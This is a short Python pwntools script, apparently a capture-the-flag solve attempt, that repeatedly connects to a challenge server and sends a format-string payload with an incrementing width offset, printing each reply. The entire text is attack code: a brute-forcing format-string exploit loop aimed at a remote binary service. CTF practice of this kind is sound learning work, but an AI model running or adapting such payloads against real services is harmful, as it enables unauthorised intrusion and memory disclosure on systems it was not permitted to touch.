import pwn
elf = pwn.context.binary =pwn.ELF("./ssId")

offset = 269168516
for i in range(0x4000):
    io = pwn.remote("chall.nitdgplug.org",30092)
    payload = f"%1$*{offset}$x %1073741824$"
    io.sendline(payload)
    mssg = io.recv(timeout=1)
    print(mssg)
    io.close()
    offset += 20000